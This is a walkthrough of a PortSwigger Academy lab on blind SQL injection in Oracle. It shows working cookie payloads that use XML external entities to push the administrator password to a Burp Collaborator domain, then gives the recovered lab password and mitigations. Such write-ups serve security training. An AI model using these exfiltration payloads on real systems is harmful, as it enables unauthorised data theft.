# 📘 PortSwigger Lab: Blind SQL Injection with Out-of-Band Data Exfiltration

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Attack Idea](#idea)
- [🧩 Theory: OAST Exfiltration](#theory-oast)
- [🧩 Why Burp Collaborator Is Used](#collaborator)
- [🔍 Step 1 — Find the TrackingId Cookie](#step1)
- [🔍 Step 2 — Generate a Collaborator Payload](#step2)
- [🔍 Step 3 — Confirm the OAST Channel](#step3)
- [🔍 Step 4 — Place the Password in the Subdomain](#step4)
- [🔍 Step 5 — Read the Password in Collaborator](#step5)
- [🔍 Step 6 — Login as administrator](#step6)
- [🧩 Payloads Used](#payloads)
- [🔬 Payload Breakdown](#breakdown)
- [💥 Why the Attack Worked](#why)
- [🧠 Pentester Logic](#pentester-logic)
- [🛡 Mitigation](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Recover the `administrator` password using blind SQL injection with out-of-band data exfiltration and log in.

The SQL query result is not returned in the HTTP response, so the password must be leaked through an external DNS/HTTP interaction with Burp Collaborator.

---

<a id="idea"></a>

## 🧠 Attack Idea

The application uses the `TrackingId` cookie inside a SQL query. The query is executed asynchronously and does not affect the visible HTTP response.

Classic techniques are not useful here:

```text
Boolean-based → no visible page difference
Error-based   → no visible error
Time-based    → the background SQL query does not affect the response
```

Instead, we use OAST: force the database to contact Burp Collaborator and place the password in the requested subdomain.

Example interaction:

```text
u90spdtrpki2bbpb93b7.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

The first part of the domain is the password.

---

<a id="theory-oast"></a>

## 🧩 Theory: OAST Exfiltration

OAST means **Out-of-Band Application Security Testing**.

Normal channel:

```text
Browser → application → HTTP response
```

OAST channel:

```text
Browser → application → database → DNS/HTTP request → Burp Collaborator
```

Exfiltration means that we do not only confirm the vulnerability, but also send data out. In this lab, data is placed in a subdomain:

```text
<password>.<collaborator-domain>
```

---

<a id="collaborator"></a>

## 🧩 Why Burp Collaborator Is Used

Burp Collaborator provides a unique domain and records all interactions with it:

```text
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

If the vulnerable server or database contacts this domain, Burp shows an interaction such as DNS or HTTP.

The Academy platform blocks arbitrary external systems, so this lab must be solved using Burp Collaborator.

---

<a id="step1"></a>

## 🔍 Step 1 — Find the TrackingId Cookie

In Burp Suite, open the shop request and locate the `Cookie` header.

```http
Cookie: TrackingId=<value>; session=<value>
```

The interesting value is `TrackingId`, because the lab description says that it is used inside a SQL query.

Logic:

```text
TrackingId is user-controlled
↓
TrackingId reaches SQL
↓
SQL injection is possible
```

---

<a id="step2"></a>

## 🔍 Step 2 — Generate a Collaborator Payload

In Burp Suite Professional, open Collaborator Client and copy a payload:

```text
Burp → Collaborator client → Copy to clipboard
```

Example domain:

```text
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

This domain will be inserted into the SQL/XML payload.

---

<a id="step3"></a>

## 🔍 Step 3 — Confirm the OAST Channel

First, confirm the external interaction without extracting data.

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

After sending the request, go to Collaborator and click `Poll now`.

If a DNS/HTTP interaction appears, the database processed the payload and contacted Collaborator.

---

<a id="step4"></a>

## 🔍 Step 4 — Place the Password in the Subdomain

Now add a SQL query that retrieves the password:

```sql
SELECT password FROM users WHERE username='administrator'
```

Place it before the Collaborator domain:

```text
<password>.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Payload:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Flow:

```text
Oracle runs SELECT password
↓
the password is inserted into the URL
↓
the XML parser loads the external entity
↓
a DNS lookup is performed
↓
Collaborator records the password in the hostname
```

---

<a id="step5"></a>

## 🔍 Step 5 — Read the Password in Collaborator

Click `Poll now`.

DNS lookup received:

```text
u90spdtrpki2bbpb93b7.p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com
```

Breakdown:

```text
u90spdtrpki2bbpb93b7 → database password
p9gquw29wve9xjjktpylfy9gsejka81wq.oastify.com → Collaborator domain
```

---

<a id="step6"></a>

## 🔍 Step 6 — Login as administrator

Open `My account` and use the recovered credentials.

<details>
<summary>🔑 Show administrator password</summary>

```text
Username: administrator
Password: u90spdtrpki2bbpb93b7
```

</details>

---

<a id="payloads"></a>

## 🧩 Payloads Used

Confirm OAST channel:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR-DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

Exfiltrate administrator password:

```http
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR-DOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

---

<a id="breakdown"></a>

## 🔬 Payload Breakdown

`x'` closes the original SQL string. After that, we can inject our own SQL.

`UNION SELECT` makes Oracle execute an additional SELECT. The result does not need to be shown in the page; we only need Oracle to execute the XML function.

`EXTRACTVALUE(xmltype(...), '/l')` forces Oracle to parse XML and process the XML entity.

`DOCTYPE` defines an XML entity. The `ENTITY % remote SYSTEM "http://..."` part points to an external resource.

`%remote;` activates the external entity and triggers the request.

`'||(SELECT password FROM users WHERE username='administrator')||'` concatenates the database password into the Collaborator hostname.

`FROM dual` is required because this is Oracle. The `dual` table is used when selecting an expression without a real table.

`--` comments out the rest of the original SQL query.

---

<a id="why"></a>

## 💥 Why the Attack Worked

The attack worked because:

- `TrackingId` was inserted directly into SQL;
- the application did not use parameterized queries;
- the database was Oracle;
- Oracle XML processing could load external entities;
- outbound DNS requests were allowed;
- Burp Collaborator recorded the interaction;
- the password was placed in the subdomain.

---

<a id="pentester-logic"></a>

## 🧠 Pentester Logic

The OAST payload looks complex, but it is built from clear blocks:

```text
Close the string
↓
Add UNION SELECT
↓
Trigger XML parser
↓
Define an external entity
↓
Insert Collaborator domain
↓
Concatenate SELECT password
↓
Receive DNS lookup
```

Main idea:

```text
If the data cannot be seen in the HTTP response,
force the server to send it out-of-band.
```

---

<a id="defense"></a>

## 🛡 Mitigation

- Use prepared statements.
- Use parameterized queries.
- Do not build SQL by string concatenation.
- Restrict outbound DNS/HTTP from database servers.
- Disable dangerous XML features and external entity processing.
- Monitor suspicious DNS queries.
- Restrict database user privileges.

---

<a id="checklist"></a>

## 🛠 Checklist

- [x] `TrackingId` parameter identified
- [x] Collaborator payload generated
- [x] OAST channel confirmed
- [x] Password placed in subdomain
- [x] DNS lookup received
- [x] administrator password extracted
- [x] Login as administrator completed

---

# ⬆ Back to top

[Return to contents](#top)
